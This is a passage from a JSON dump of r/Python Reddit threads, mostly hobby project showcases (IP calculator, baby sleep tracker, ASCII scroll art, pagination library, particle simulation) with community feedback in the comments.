                    "content": "Good points here that I have not thought about thanks for the suggestions!"
                }
            ]
        },
        {
            "author": "ranklebone",
            "score": "2",
            "content": "ipaddress"
        },
        {
            "author": "lytn1ng",
            "score": "1",
            "content": "The best one that I have found so far, is https://www.davidc.net/sites/default/subnets/subnets.html. It's easy to understand. You can put in whatever Network address and mask, and it shows you the range of IPs available. And it can even split the given range into smaller ranges."
        },
        {
            "author": "zanfar",
            "score": "1",
            "content": "The biggest issue I see is that it's functionally impossible to execute. If I have to cd to a directory and type python3 ipcalc.py in addition to the actual command I want, or use a potentially long absolute path, I'm going to gravitate to some other tool. Why is this not a package? Why does this not install a binary/shim? IPv6? The README should really include an example of the output without having to wait for a GIF to reach a certain timestamp. Here is my internal-use WIP if you want to compare: https://github.com/therealzanfar/iptool/tree/feature-summarization",
            "replies": [
                {
                    "author": "nicanorflavier",
                    "score": "1",
                    "content": "Thanks for the points here, I will try and see if I can accommodate what you mentioned here, and thanks for pointing me to your project."
                }
            ]
        },
        {
            "author": "nicanorflavier",
            "score": "1",
            "content": "Thanks for all your feedbacks., this is all more for learning. I have made changes to the code and have managed to sort out all your feedbacks and thanks to those. I change the code to use bitwise operation I added the CLASS C and D. I updated the README file too on why use this project and everyone is welcome to see the code and contribute and rise issues and features. And I added a minor version release that have a binary file for ubuntu and windows. Any other feedback?"
        }
    ]
},
{
    "post_author": "oyvinrog",
    "post_id": "g4cf2r",
    "post_score": "2048",
    "post_time": "Sunday, April 19, 2020 at 9:13:51 PM GMT+3",
    "flair_text": "News",
    "post_title": "MS considers adding Python as official scripting language for Excel 😍 The change proposal currently has 6400 votes.",
    "media": [
        "http://mc.milliononpcgames.com/?p=5886"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "danielsarj",
            "score": "336",
            "content": "That survey has been up for years so I wouldn’t expect it happening anytime soon, though."
        },
        {
            "author": "KimPeek",
            "score": "95",
            "content": "They have been considering this for years now with no progress. Don't get your hopes up too much."
        },
        {
            "author": "BoaVersusPython",
            "score": "86",
            "content": "The first sheets app to get to python wins. Not quite sure why they would consider NOT doing this."
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "In the mean time we can use xlwings."
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "This website is cancerous"
        },
        {
            "author": "arkster",
            "score": "14",
            "content": "I'd start using excel more if that happened. But I expect other apps such as libreoffice to evolve in the same manner."
        },
        {
            "author": "gitcraw",
            "score": "13",
            "content": "Why are we upvoting spam?"
        },
        {
            "author": "brownboy_5",
            "score": "8",
            "content": "Only question is, where do I sign?"
        },
        {
            "author": "illusion_disillusion",
            "score": "3",
            "content": "Cool, as much as I like https://xlsxwriter.readthedocs.io/ it's a bit verbose."
        },
        {
            "author": "ronmarti",
            "score": "2",
            "content": "That's not even an article worth reading."
        }
    ]
},
{
    "post_author": "teamamentum",
    "post_id": "1cqjpft",
    "post_score": "6",
    "post_time": "Monday, May 13, 2024 at 1:21:14 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "map_plotter - abstracts complexity of creating intensity plots overlaid onto global map",
    "media": [
        "https://github.com/amentumspace/map_plotter"
    ],
    "post_content": "What My Project Does\nOverlaying intensity plots onto a geographical map using cartopy/matplotlib can be complex. So we created this map_plotter package to abstract away that complexity for a common use case.\nInstallation\n(opinionated use of conda to avoid cartopy dependency hell and install precompiled binaries)\nconda install cartopy\ngit clone git@github.com:amentumspace/map_plotter.git\ncd map_plotter\npip install .\nUsage\nimport map_plotter\nmap_plotter.plot(lons_g, lats_g, variable, units=\"m/s\", img_name=\"image.png\",\n    save=True, plot=True, title=\"something\", zlims=[0,10])\nWhereby:\nlons_g and lats_g represent 2D matrices / grids of longitudes and latitudes.\nvalues is the matrix of values to be plotted (same grid dimensions).\nunits and img_name (self explanatory).\nsave & plot boolean flags to save the file and plot to screen, respectively.\nzlims define the color scale minimum and maximum.\nTarget Audience\nPython developers or data scientists or scientists or any Pythonista wanting a simple way to quickly plot an intensity map onto a geographical map.\nComparison\nDiffers from using cartopy and matplotlib in its ease-of-use, but it is less customisable (can't change projections, colors). Regardless, it's convenient and at least provides a starting point for customisation. Similar functionality can be had from geopandas or folium (although cartopy/matplotlib suited our needs better).",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1cp43wy",
    "post_score": "3",
    "post_time": "Saturday, May 11, 2024 at 3:00:12 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "BX1959",
    "post_id": "1csa6j0",
    "post_score": "19",
    "post_time": "Wednesday, May 15, 2024 at 5:28:57 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I created a Python script that makes it easier to track how your baby's sleep is improving",
    "media": [
        "https://github.com/kburchfiel/baby_sleep_analysis/blob/main/Sleep%20Dataset%20Generator.ipynb",
        "https://github.com/kburchfiel/baby_sleep_analysis/",
        "https://github.com/kburchfiel/baby_sleep_analysis/tree/main/Visualizations"
    ],
    "post_content": "My wife and I use the Huckleberry app to track our baby's sleep periods. Although the free version of the app allows you to view a number of sleep-related metrics, I also wanted to see whether his longest nightly sleep stretches were getting longer over time. Therefore, I created a Python project to help me answer this and other questions I had about my baby's sleep.\nWhat My Project Does\nThis project reads in data from a Huckleberry .csv export (or a separate custom .csv file); analyzes its sleep information; and then produces a number of visualizations.\nPersonally, I've found that running the code and viewing its output helps reassure me that our baby is making progress with sleep, even if he seems to have some setbacks now and then! I hope you'll find it useful as well in evaluating the effectiveness of your sleep training approach.\nTarget Audience\nThis project can be useful for any parent who wishes to see how his or her baby's sleep is improving over time. (It could be used for other age ranges as well, but the code and visualizations are geared towards infant sleep data.)\nThe project's readme has instructions on using the code to track your own baby's sleep data.\nComparison\nThis project is released under the open-source MIT license, so you are welcome to use and modify it for free. (I imagine that this is not the case for many sleep analysis tools.)\nAs noted earlier, the project allows you to see how your baby's longest daily sleep stretch has improved over time. (The longer your baby sleeps at any given point, the longer you get to sleep, so I think this metric is of great interest to most parents!) I don't think the free version of Huckleberry includes this data in line chart form, though you can get a sense of this improvement by scrolling through your daily sleep data.\nThis script also separates individaul sleep entries into their respective daytime and nighttime components. For instance, if your baby slept from 6 AM to 9 AM, and you've specified the nighttime period to end at 7 AM (the default setting), the script will treat this entry as one hour of nighttime sleep and 2 hours of daytime sleep. I don't think Huckleberry offers this same functionality, though I could be wrong.\n(Note: The sample data shown within the project is completely made up using another Python script, and is not meant to reflect normal sleep patterns in infants.)",
    "comments": [
        {
            "author": "cipri_tom",
            "score": "12",
            "content": "You have a newborn and you have time to develop stuff?",
            "replies": [
                {
                    "author": "BX1959",
                    "score": "7",
                    "content": "It's funny, but for me, projects like this are a big part of my self-care strategy as a new dad. I love seeing the code and visualizations come together. With regard to logistics: much of this project was created when he was asleep on my chest in a baby carrier--or when he was in his crib at night. I'm also fortunate to have a very supportive wife who tolerates these projects!"
                },
                {
                    "author": "bobalonghazardly",
                    "score": "1",
                    "content": "I also had that same question but also like baby sleep is improving? Outside the first couple months it’s been nightly wake up 3-5 times 😕"
                }
            ]
        },
        {
            "author": "nbviewerbot",
            "score": "3",
            "content": "I see you've posted a GitHub link to a Jupyter Notebook! GitHub doesn't render large Jupyter Notebooks, so just in case, here is an nbviewer link to the notebook: https://nbviewer.jupyter.org/url/github.com/kburchfiel/baby_sleep_analysis/blob/main/Sleep%20Dataset%20Generator.ipynb Want to run the code yourself? Here is a binder link to start your own Jupyter server and try it out! https://mybinder.org/v2/gh/kburchfiel/baby_sleep_analysis/main?filepath=Sleep%20Dataset%20Generator.ipynb I am a bot. Feedback | GitHub | Author"
        }
    ]
},
{
    "post_author": "60percentcocoa",
    "post_id": "1cotppy",
    "post_score": "0",
    "post_time": "Friday, May 10, 2024 at 7:29:38 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Pre-commit hook to keep coverage badge in README up to date",
    "media": [
        "https://github.com/pytest-dev/pytest-cov",
        "https://github.com/Weird-Sheep-Labs/coverage-pre-commit"
    ],
    "post_content": "Wrote this as a tool to keep README coverage badges up to date without relying on 3rd party services or having to do anything extra, thought others might get some utility out of it: coverage-pre-commit.\nA .coverage file is expected at the root of the project, generated by running coverage run directly or using a plugin such as pytest-cov when running tests.\nMost convenient when used as a pre-push hook imo. Feel free to opine, be it positive or negative!",
    "comments": []
},
{
    "post_author": "StephanoCarlson",
    "post_id": "hzuy44",
    "post_score": "2047",
    "post_time": "Wednesday, July 29, 2020 at 8:29:15 AM GMT+3",
    "flair_text": "Beginner Project",
    "post_title": "Program to Convert an Image into Dice. (w/ code)",
    "media": [
        "https://preview.redd.it/1k9io9ereqd51.png?width=640&crop=smart&auto=webp&s=d5b045885d40539f05b461af91d5104208a603d8",
        "https://i.redd.it/1k9io9ereqd51.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "khalkhall",
            "score": "89",
            "content": "Can anyone find a 6? EDIT: Found them on his collar!",
            "replies": [
                {
                    "author": "FlatProtrusion",
                    "score": "46",
                    "content": "Ah! My eyes!",
                    "replies": [
                        {
                            "author": "WadeEffingWilson",
                            "score": "7",
                            "content": "My legs!"
                        }
                    ]
                }
            ]
        },
        {
            "author": "StephanoCarlson",
            "score": "78",
            "content": "Github, feedback welcome Yes, this was the inspiration Edit: From request I made a variation that makes an excel document with the dice numbers here"
        },
        {
            "author": "treetyoselfcarol",
            "score": "15",
            "content": "zooms in yup it's dice"
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "Very nice! Would you be ok if I use this to create some screen-print shirts? Just for me...not for sale."
        },
        {
            "author": "3fflix",
            "score": "3",
            "content": "this is awesome! there's just a problem if the dice_number in your draw_dice function becomes zero.. can easily be avoided if you just add a if die_number ==0: continue after determining the die_number :)"
        },
        {
            "author": "coppercrystalz",
            "score": "9",
            "content": "Very cool!"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "Cool project! Are they ASCII dices?"
        },
        {
            "author": "rrklaffed",
            "score": "2",
            "content": "So are you just mapping ranges of grays to 6 keys? contemplating how i would try this:) super cool"
        }
    ]
},
{
    "post_author": "daivushe1",
    "post_id": "1col34c",
    "post_score": "3",
    "post_time": "Friday, May 10, 2024 at 12:03:45 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PyWolt: Wolt food delivery service API wrapper",
    "media": [
        "https://github.com/Valaraucoo/what-to-eat",
        "https://github.com/muttley79/woltcheck",
        "https://github.com/ilyafeldman/pywolt.git"
    ],
    "post_content": "I'm thrilled to share my first open-source project with you all: PyWolt! 🎉\nPyWolt is a Python library that makes it super easy to interact with the Wolt API.\nWhat My Project Does:\nDiscover Venues: Find nearby spots to grab a bite.\nExplore Menus: Dive into a venue's menu and pick your favorites.\nTarget Audience:\nSoftware Engineers: Professionals who build web or mobile applications, particularly those in the food delivery or restaurant industry, looking to incorporate Wolt's services seamlessly into their platforms.\nData Scientists/Analysts: Individuals analyzing food delivery data, consumer behavior, or market trends, who may utilize PyWolt to gather data from Wolt's API for analysis and insights.\nStudents/Learners: Those studying Python programming, web development, or API integration, who can use PyWolt as a practical example or learning tool to understand how to interact with RESTful APIs in Python.\nFreelancers/Entrepreneurs: Independent developers or startup founders looking to build new food-related applications or services leveraging Wolt's platform without reinventing the wheel.\nComparison:\nwoltcheck: only offers a script to check if a wolt restaurant is ready to deliver to your location.\nwhat-to-eat: a pretty neat cli tool that offers all of pywolt's functionality. In my opinion it overcomplicates things a little, and doesn't offer straight-forward RESTful functionality to interact with the API itself.",
    "comments": []
},
{
    "post_author": "dimakiss",
    "post_id": "h0chuy",
    "post_score": "2029",
    "post_time": "Wednesday, June 10, 2020 at 5:48:11 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Currency converter - my first web scraping project :)",
    "media": [
        "https://external-preview.redd.it/WYNMZSoTRFWD-e32BJrwqfWFIn46POweW1uWEEUe0Os.png?auto=webp&s=6f71ee651c8b244f6612a2cbf5f2975c69f40d40",
        "https://i.imgur.com/VPPvQig.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "dimakiss",
            "score": "124",
            "content": "This is a simple currency converter using web scraping for getting up to date currency prices. Also possible to use it offline. Source: https://github.com/dimakiss/Currency-converter",
            "replies": [
                {
                    "author": "tomasgodoy5",
                    "score": "120",
                    "content": "Now test it with the Argentinian peso (ARS). Cries in devaluation"
                }
            ]
        },
        {
            "author": "CatAndTheCuddles",
            "score": "30",
            "content": "Going to start with Django soon. Really excited for it... Will remember to add more functionalities to your idea..."
        },
        {
            "author": "acroporaguardian",
            "score": "13",
            "content": "Make one that does the South Park thing and you put your money in and it goes, \"oooooh and its gone!\""
        },
        {
            "author": "Karlm8",
            "score": "44",
            "content": "It says convertOr. Literally unusable."
        }
    ]
},
{
    "post_author": "BX1959",
    "post_id": "1csa6j0",
    "post_score": "19",
    "post_time": "Wednesday, May 15, 2024 at 5:28:57 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I created a Python script that makes it easier to track how your baby's sleep is improving",
    "media": [
        "https://github.com/kburchfiel/baby_sleep_analysis/blob/main/Sleep%20Dataset%20Generator.ipynb",
        "https://github.com/kburchfiel/baby_sleep_analysis/",
        "https://github.com/kburchfiel/baby_sleep_analysis/tree/main/Visualizations"
    ],
    "post_content": "My wife and I use the Huckleberry app to track our baby's sleep periods. Although the free version of the app allows you to view a number of sleep-related metrics, I also wanted to see whether his longest nightly sleep stretches were getting longer over time. Therefore, I created a Python project to help me answer this and other questions I had about my baby's sleep.\nWhat My Project Does\nThis project reads in data from a Huckleberry .csv export (or a separate custom .csv file); analyzes its sleep information; and then produces a number of visualizations.\nPersonally, I've found that running the code and viewing its output helps reassure me that our baby is making progress with sleep, even if he seems to have some setbacks now and then! I hope you'll find it useful as well in evaluating the effectiveness of your sleep training approach.\nTarget Audience\nThis project can be useful for any parent who wishes to see how his or her baby's sleep is improving over time. (It could be used for other age ranges as well, but the code and visualizations are geared towards infant sleep data.)\nThe project's readme has instructions on using the code to track your own baby's sleep data.\nComparison\nThis project is released under the open-source MIT license, so you are welcome to use and modify it for free. (I imagine that this is not the case for many sleep analysis tools.)\nAs noted earlier, the project allows you to see how your baby's longest daily sleep stretch has improved over time. (The longer your baby sleeps at any given point, the longer you get to sleep, so I think this metric is of great interest to most parents!) I don't think the free version of Huckleberry includes this data in line chart form, though you can get a sense of this improvement by scrolling through your daily sleep data.\nThis script also separates individaul sleep entries into their respective daytime and nighttime components. For instance, if your baby slept from 6 AM to 9 AM, and you've specified the nighttime period to end at 7 AM (the default setting), the script will treat this entry as one hour of nighttime sleep and 2 hours of daytime sleep. I don't think Huckleberry offers this same functionality, though I could be wrong.\n(Note: The sample data shown within the project is completely made up using another Python script, and is not meant to reflect normal sleep patterns in infants.)",
    "comments": [
        {
            "author": "cipri_tom",
            "score": "12",
            "content": "You have a newborn and you have time to develop stuff?",
            "replies": [
                {
                    "author": "BX1959",
                    "score": "7",
                    "content": "It's funny, but for me, projects like this are a big part of my self-care strategy as a new dad. I love seeing the code and visualizations come together. With regard to logistics: much of this project was created when he was asleep on my chest in a baby carrier--or when he was in his crib at night. I'm also fortunate to have a very supportive wife who tolerates these projects!"
                },
                {
                    "author": "bobalonghazardly",
                    "score": "1",
                    "content": "I also had that same question but also like baby sleep is improving? Outside the first couple months it’s been nightly wake up 3-5 times 😕"
                }
            ]
        },
        {
            "author": "nbviewerbot",
            "score": "3",
            "content": "I see you've posted a GitHub link to a Jupyter Notebook! GitHub doesn't render large Jupyter Notebooks, so just in case, here is an nbviewer link to the notebook: https://nbviewer.jupyter.org/url/github.com/kburchfiel/baby_sleep_analysis/blob/main/Sleep%20Dataset%20Generator.ipynb Want to run the code yourself? Here is a binder link to start your own Jupyter server and try it out! https://mybinder.org/v2/gh/kburchfiel/baby_sleep_analysis/main?filepath=Sleep%20Dataset%20Generator.ipynb I am a bot. Feedback | GitHub | Author"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1coby3c",
    "post_score": "7",
    "post_time": "Friday, May 10, 2024 at 3:00:43 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "caks",
            "score": "2",
            "content": "What's the best approach to missing stubs? Ignore? Install stubs package?"
        }
    ]
},
{
    "post_author": "AlSweigart",
    "post_id": "1cpq2d9",
    "post_score": "231",
    "post_time": "Saturday, May 11, 2024 at 11:11:23 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "2,000 lines of Python code to make this scrolling ASCII art animation: \"The Forbidden Zone\"",
    "media": [
        "https://www.youtube.com/watch?v=SyKUBXJLL50",
        "https://github.com/asweigart/scrollart/blob/main/python/forbiddenzone.py",
        "https://scrollart.org/",
        "https://www.youtube.com/watch?v=Sjk4UMpJqVs"
    ],
    "post_content": "What My Project Does\nThis is a music video of the output of a Python program: https://www.youtube.com/watch?v=Sjk4UMpJqVs\nI'm the author of Automate the Boring Stuff with Python and I teach people to code. As part of that, I created something I call \"scroll art\". Scroll art is a program that prints text from a loop, eventually filling the screen and causing the text to scroll up. (Something like those BASIC programs that are 10 PRINT \"HELLO\"; 20 GOTO 10)\nOnce printed, text cannot be erased, it can only be scrolled up. It's an easy and artistic way for beginners to get into coding, but it's surprising how sophisticated they can become.\nThe source code for this animation is here: https://github.com/asweigart/scrollart/blob/main/python/forbiddenzone.py (read the comments at the top to figure out how to run it with the forbiddenzonecontrol.py program which is also in that repo)\nThe output text is procedurally generated from random numbers, so like a lava lamp, it is unpredictable and never exactly the same twice.\nThis video is a collection of scroll art to the music of \"The Forbidden Zone,\" which was released in 1980 by the band Oingo Boingo, led by Danny Elfman (known for composing the theme song to The Simpsons.) It was used in a cult classic movie of the same name, but also the intro for the short-run Dilbert animated series.\nTarget Audience\nAnyone (including beginners) who wants ideas for creating generative art without needing to know a ton of math or graphics concepts. You can make scroll art with print() and loops and random numbers. But there's a surprising amount of sophistication you can put into these programs as well.\nComparison\nBecause it's just text, scroll art doesn't have such a high barrier to entry compared with many computer graphics and generative artwork. The constraints lower expectations and encourage creativity within a simple context.\nI've produced scroll art examples on https://scrollart.org\nI also gave a talk on scroll art at PyTexas 2024: https://www.youtube.com/watch?v=SyKUBXJLL50",
    "comments": [
        {
            "author": "Get-ADUser",
            "score": "34",
            "content": "This is AWESOME. Those of us that program as a day job can be very quick to forget that programming is a creative activity just as much as writing, drawing, sculpting, etc. Projects like this really serve to remind us that what we do is an art form. Projects like this need to exist, and I'm extremely glad that this one does. Also, in regards to your book: thank you! I picked it up as part of a humble bundle years ago and as a result it's what I point people to immediately when I get asked about learning to code.",
            "replies": [
                {
                    "author": "AlSweigart",
                    "score": "11",
                    "content": "Yeah! I like how scroll art makes you stick to the basics and the standard library. There's no extra libraries you need to install, which means you can code it in browser-based REPLs with no need to install Python even. And every programming language has print() and loops, so it's not limited to Python or any particular OS. And it is text but it doesn't require the user to know English; you can understand it in any human language. I'm collecting a bunch of examples at https://scrollart.org and I'm hoping this style of program becomes a common way for beginners to get into coding since it has such a low barrier to entry.",
                    "replies": [
                        {
                            "author": "Get-ADUser",
                            "score": "2",
                            "content": "It's also a base to build upon too. A great next project would be to build a generic audio visualizer, like they used to have in Windows Media Player, but with ASCII art.",
                            "replies": [
                                {
                                    "author": "binlargin",
                                    "score": "1",
                                    "content": "Yeah that'd be awesome. It'd also be great to turn some of the music generation AI on its head and use it to extract themes, and use that to direct the visuals. Like each musical theme becomes a kind of character or effect, and it visits with the audio and acts like it feels."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ludwig-boltzmann_",
            "score": "19",
            "content": "This reminds me of a side project I did recently: https://github.com/isaac-j-miller/particle-simulation. Basically it just models gravity and elastic collisions, and I use it to make art"
        },
        {
            "author": "XUtYwYzz",
            "score": "6",
            "content": "Big fan of terminal art here. If you like this sort of thing, I’ve been working on a project called TerminalTextEffects. It’s basically a character based terminal animation engine with a bunch of bundled effects. https://github.com/ChrisBuilds/terminaltexteffects"
        },
        {
            "author": "Hey_Look_80085",
            "score": "5",
            "content": "So retro. I was helping someone with their asciii scroll road and making art with it just the other day. Where's that code now..."
        },
        {
            "author": "Brave-Impression-338",
            "score": "4",
            "content": "This is seriously cool. Thanks for sharing!"
        },
        {
            "author": "rsayers",
            "score": "2",
            "content": "I love it, I was at PyTexas and have been hacking away at little scrollart demos over since. I really enjoyed the talk!"
        },
        {
            "author": "flyingfox",
            "score": "2",
            "content": "Love how it contains both an ending fade out and and ending quine."
        },
        {
            "author": "deathtrooper12",
            "score": "2",
            "content": "I absolutely love this, thank you for sharing."
        },
        {
            "author": "-Blue_Bull-",
            "score": "2",
            "content": "This is cool, art of this kind qualifies as being part of the demo scene subculture. Just put demoscene into youtube and you'll find this amazing world of coding and creativity."
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": ":D",
            "replies": [
                {
                    "author": "AlSweigart",
                    "score": "2",
                    "content": ":D"
                }
            ]
        },
        {
            "author": "Nadaesque",
            "score": "2",
            "content": "Most excellent choice of art. Do Dr. Caligari (1989) next."
        },
        {
            "author": "ggchappell",
            "score": "2",
            "content": "Very nice. P.S. Figlet sighting!",
            "replies": [
                {
                    "author": "AlSweigart",
                    "score": "3",
                    "content": "Haha, yeah. For those who don't know, Figlet is a tool used to create large banner text using ASCII art. For example, I used it for: __ __|  |                ____|              |     _)      |      |                  __  / |    __ \\    _ \\      |      _ \\    __|  __ \\   |   _` |   _` |   _ \\  __ \\         /    _ \\   __ \\    _ \\ |    | | |   __/      __|   (   |  |     |   |  |  (   |  (   |   __/  |   |       /    (   |  |   |   __/ _|   _| |_| \\___|     _|    \\___/  _|    _.__/  _| \\__,_| \\__,_| \\___| _|  _|     ____| \\___/  _|  _| \\___| There's an online figlet generator here: https://doodlenerd.com/web-tool/figlet-generator"
                }
            ]
        },
        {
            "author": "EmergentDeath",
            "score": "2",
            "content": "I love u",
            "replies": [
                {
                    "author": "AlSweigart",
                    "score": "2",
                    "content": "Thank you, internet stranger! :D"
                }
            ]
        },
        {
            "author": "HSNubz",
            "score": "1",
            "content": "Hiya. From the opening comment: (I've started looking at YouTube videos to figure out what DJs actually do, and it turns out I could have made all this a lot simpler if I had known basic DJing stuff from the start, LOL. Ah well, never to late to learn for the future.) Could you expand on this comment? What could be made simpler?"
        },
        {
            "author": "buqr",
            "score": "1",
            "content": "Where is the Mona Lisa and Scream ASCII art from?",
            "replies": [
                {
                    "author": "AlSweigart",
                    "score": "2",
                    "content": "I used an online ASCII art generator to convert images. I think it was this one (there's a ton you can google): https://www.ascii-art-generator.org/ By tilting the images a few degrees before converting, I made them look at bit more interesting."
                }
            ]
        }
    ]
},
{
    "post_author": "kernelslayer",
    "post_id": "1cqzf6o",
    "post_score": "10",
    "post_time": "Monday, May 13, 2024 at 4:33:19 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "SQLPage - a Python library to add string token based pagination easily",
    "media": [
        "https://pypi.org/project/sqlpage/",
        "https://github.com/prabhupant/sqlpage"
    ],
    "post_content": "What My Project Does - This is a Python package to easily add string token based pagination. Currently it supports SQLModel and SQLAlchemy ORMs.\nRecently I wanted to add pagination in one of my Python projects and in the API response, I had to return a string next page token. Now I could not find a straight-forward way of doing this in Python. All of the tutorials or blog posts I saw, there in the response the server always returned a page_number, page_size, and total_elements and then the onus was on the calling service to adjust this accordingly. \nComparison - The current packages and methods requires some changes in the app layer as well. I tried using a few but those did not satisfy the use case and were also a bit harder to implement. I could not find a easy to use option. The present ones returned integers instead of a string token\nI wanted it to be simpler, just like OpenSearch - you call its search API and it returns 10 elements and a next_page_token and then for the next 10 (or you configure this using the size parameter) you use the next_page_token in the subsequent request to get to the new page.\nI ended up doing a lot of if-else checks and encoding and decoding, so I decided to create this library.\nTarget Audience - This is production ready, have been using it in one of my projects. Hope some of you folks find it useful :)\nHere is the link to the PyPi repository and here is the GitHub repo",
    "comments": [
        {
            "author": "riklaunim",
            "score": "1",
            "content": "If you know total and page size you can generate start to end pagination. With only next page you can't so it's somewhat different. If the endpoint uses some more complex query then the count function could be expensive and \"next page\" only approach would be faster but IMHO that would be done on endpoint layer when returning different metadata. In your code you are hiding the count behind a proxy model and not exposing all the metadata? That's bit weird as it would combine disadvantages of both solutions. Also your tests need some work - you should use assertions, proper test cases, probably also FactoryBoy to create require data in the database.",
            "replies": [
                {
                    "author": "kernelslayer",
                    "score": "1",
                    "content": "Thanks for the feedback, appreciate it! Yes, I got to work on the test. Right now the \"test\" is just a script to test if the code was working. I am planning to add other details like totalElements, currentPage in the PageData object shortly. Also, if the count query is expensive, is there any other way to optimise this? Because, I think, without knowing the total elements, we might not be able to do the calculation needed for pagination. And I was looking at Spring Boot's JPA and it also does a count operation"
                }
            ]
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "dxq4ea",
    "post_score": "2029",
    "post_time": "Sunday, November 17, 2019 at 9:16:00 PM GMT+3",
    "flair_text": "",
    "post_title": "This is one of the most interesting outputs of the particle simulation :)",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "LAMagicx",
            "score": "89",
            "content": "Do all mutations of this eventually converge into one big ball that then disappears or are there others that are similar to this? Or even one that has a stable orbit.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "92",
                    "content": "Yeah, a couple of them show stable orbits. If you just place to particles, one at (0, a) with velocity (b, 0) and one at (0, -a) with velocity (-b, 0), they will nicely orbit each other (kinda like a dual star system).",
                    "replies": [
                        {
                            "author": "Afrotom",
                            "score": "33",
                            "content": "I would very much like to see that."
                        },
                        {
                            "author": "LAMagicx",
                            "score": "6",
                            "content": "So therefore a random distribution should get stable orbits as well cool. Great job I like the idea of the combining masses. Could maybe try bouncing the planets of each other as well?"
                        },
                        {
                            "author": "kyrsjo",
                            "score": "5",
                            "content": "Very cool project! The orbits aren't really stable (elliptical) tough -- the axis is precessing. I think you don't have the right exponent of the distance between the bodies -- it should be 1/r^2, but I think it is something less... Looked at your code and, indeed, it is 1/r, not 1/r^2:In `universe.py`, you have: `force = diff * (p1.mass * p2.mass) / (dist ** 2)` where `diff = p2.pos - p1.pos` -- try to change the force to be `force = diff * (p1.mass * p2.mass) / (dist ** 3)` and it will be more physically correct :) Also, it looks like you've implemented an Euler-Cromer integrator -- that's great, it's more accurate for this type of simulations (gravity etc.). Normally one first updates the velocity and then the position using the updated velocity, but the other way works too (it's mostly a difference of how it starts off and when you plot). However, in your loop of `for p1, p2 in combinations(self.particles, r=2):`, what happens when you do `self.remove_particle(p2)` inside it? How does `combinations` really handle it?"
                        },
                        {
                            "author": "icbint",
                            "score": "-2",
                            "content": "so what you're saying is that the moon will eventually hit the earth... great..."
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "72",
            "content": "Source code: https://gitlab.com/chrismit3s/just-dust Inspired by this post by u/mittwochmensch :)"
        },
        {
            "author": "RoboticElfJedi",
            "score": "34",
            "content": "You should see what astrophysicists do with a million CPU-hours running these sorts of simulations. It’s pretty cool."
        },
        {
            "author": "DJupiter",
            "score": "12",
            "content": "r/gifsthatendtoosoon"
        },
        {
            "author": "[deleted]",
            "score": "19",
            "content": "... of the particle simulation I made :) * Title correction"
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "Basically planet formation."
        },
        {
            "author": "jondiced",
            "score": "8",
            "content": "Congratulations, you reproduced oligarchic growth!"
        },
        {
            "author": "xd1142",
            "score": "6",
            "content": "shape: {\"[\", \"square\", \"(\", \"circle\", \".\", \"dot\"}=\"[\" argh! my eyes! but seriously, good job."
        },
        {
            "author": "anonymous_karma",
            "score": "5",
            "content": "Wow... I am new to Python.. learning it just for kicks... this is aspirational for me.. I just found what I want to have done 5 years from now.. lol.."
        }
    ]
},
{
    "post_author": "ARandomBoiIsMe",
    "post_id": "1cnsoz5",
    "post_score": "5",
    "post_time": "Thursday, May 9, 2024 at 12:02:45 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "AzuracastPy: An Unofficial Python Wrapper for the Azuracast API.",
    "media": [
        "https://github.com/AzuraCast/php-api-client",
        "https://github.com/ARandomBoiIsMe/AzuracastPy",
        "https://github.com/praw-dev/praw",
        "https://www.azuracast.com/"
    ],
    "post_content": "Source code\nWhat My Project Does:\nIt acts as a wrapper for the AzuraCast API, providing custom functions and classes for more straightforward use of the API in python projects.\nTarget Audience:\nPython users who are interested in programmatically interacting with online radios hosted on AzuraCast.\nComparison:\nThe idea of API Wrappers is not new. However, I noticed that the only existing wrapper for this API is written in PHP, which I am not experienced with. I created this project so I, and other python programmers by extension, could have an easier time working with the API.\nThis is my first \"major\" programming project, so thoughts and feedback are welcome and greatly appreciated.\nPS: Shoutout to PRAW for \"inspiring\" basically everything about the project's structure and functionality.",
    "comments": [
        {
            "author": "meronpan",
            "score": "2",
            "content": "first time i hear about azuracast, seems amazing. i ran a radio a few years ago but it was cobbled togheter with liquidsoap, icecast and a flask web ui. getting info of the current song on the website required me to scrape the icecast status page"
        }
    ]
},
{
    "post_author": "rageagainistjg",
    "post_id": "1cpyem9",
    "post_score": "10",
    "post_time": "Sunday, May 12, 2024 at 6:15:11 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Reviewing Dataframe Changes? Looking for Your Preferred Methods!",
    "media": [],
    "post_content": "After playing around with a dataframe—applying filters or other transformations—I'm curious about your methods for reviewing the changes.\nIn VS Code, the variable explorer is quite handy for a quick look at the modified dataframe. Alternatively, when working in a Jupyter notebook within VS Code, exporting the data to an Excel file provides a detailed view and allows for an easy deep dive into the results. What are your preferred practices for ensuring your data adjustments are precisely what you intended?",
    "comments": [
        {
            "author": "Scrapheaper",
            "score": "8",
